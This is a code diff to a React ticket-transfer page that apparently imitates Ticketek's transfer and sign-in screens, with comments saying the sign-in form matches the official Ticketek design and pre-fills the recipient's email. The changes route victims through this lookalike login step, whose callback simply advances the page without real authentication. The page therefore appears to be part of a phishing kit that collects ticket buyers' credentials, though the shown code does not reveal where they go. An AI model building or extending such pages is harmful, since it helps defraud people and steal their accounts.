@@ -91,8 +91,8 @@ export default function TransferPage() {
       if (rec.status === "declined") { setStep("declined"); setLoading(false); return; }
       if (rec.status === "cancelled") { setStep("invalid"); setLoading(false); return; }
 
-      // No login required — go straight to acceptance form (skip review)
-      setStep("accept");
+      // Go to login page (email pre-filled with recipient email)
+      setStep("login");
       setLoading(false);
     } catch (e) {
       setStep("invalid");
@@ -172,12 +172,12 @@ export default function TransferPage() {
       } catch (e) {}
 
  setAcceptedTickets([ticketData]);
-      setTicket(ticketData);
-      setTimeout(() => setStep("ticket_detail"), 1500);
-    } catch (e) {
-      setError(e.message || "Could not accept the transfer. Please try again.");
-      setStep("review");
-    } finally {
+ setTicket(ticketData);
+ setTimeout(() => setStep("ticket_detail"), 1500);
+ } catch (e) {
+ setError(e.message || "Could not accept the transfer. Please try again.");
+ setStep("accept_page");
+ } finally {
       setBusy(false);
     }
   };
@@ -382,8 +382,8 @@ export default function TransferPage() {
         </div>
       )}
 
-      {/* REVIEW */}
-      {step === "review" && ticket && (
+      {/* ACCEPT PAGE — shown after Sign In, user clicks Accept Ticket */}
+      {step === "accept_page" && ticket && (
         <div style={{ padding: 24 }}>
           <h2 style={{ fontSize: 24, fontWeight: 700, color: "#111", margin: "0 0 4px" }}>Accept Transferred Tickets</h2>
           <p style={{ fontSize: 14, color: "#666", margin: "0 0 20px" }}>You have received {transfer?.ticket_count || 1} ticket(s) from {transfer?.sender_email}.</p>
@@ -399,19 +399,22 @@ export default function TransferPage() {
 
           {error && <p style={{ fontSize: 13, color: "#ef4444", textAlign: "center", margin: "0 0 16px" }}>{error}</p>}
 
-          <button onClick={() => setStep("accept")}
-            style={{ display: "block", width: "100%", padding: "18px 0", borderRadius: 8, background: TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 18, border: "none", cursor: "pointer", marginBottom: 12, boxShadow: "0 2px 8px rgba(78,120,62,0.3)", textAlign: "center" }}>Accept Ticket</button>
+          <button onClick={handleConfirmAccept} disabled={busy}
+            style={{ display: "block", width: "100%", padding: "18px 0", borderRadius: 8, background: busy ? "#3a5e2e" : TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 18, border: "none", cursor: busy ? "default" : "pointer", marginBottom: 12, boxShadow: "0 2px 8px rgba(78,120,62,0.3)", textAlign: "center" }}>
+            {busy ? "Accepting…" : "Accept Ticket"}
+          </button>
           <button onClick={handleDecline} disabled={busy} style={{ width: "100%", padding: "16px 0", borderRadius: 8, background: "transparent", color: "#ef4444", fontWeight: 600, fontSize: 16, border: "1px solid #ef4444", cursor: busy ? "default" : "pointer" }}>Decline</button>
         </div>
       )}
 
-      {/* ACCEPT — Sign in / Create account page (matches official Ticketek design) */}
-      {step === "accept" && ticket && (
+      {/* LOGIN — Ticketek sign-in page (email pre-filled with recipient email) */}
+      {step === "login" && ticket && (
         <AcceptTransferForm
           senderName={(transfer?.sender_email || "").split("@")[0].replace(/[._-]/g, " ").replace(/\b\w/g, c => c.toUpperCase()) || "sender"}
           eventName={ticket.event_name || "event"}
+          recipientEmail={transfer?.recipient_email || ""}
           orderNumber={ticket.order_number}
-          onAccept={handleConfirmAccept}
+          onSignIn={() => setStep("accept_page")}
           busy={busy}
           redirectPath={"/transfer/" + token}
         />
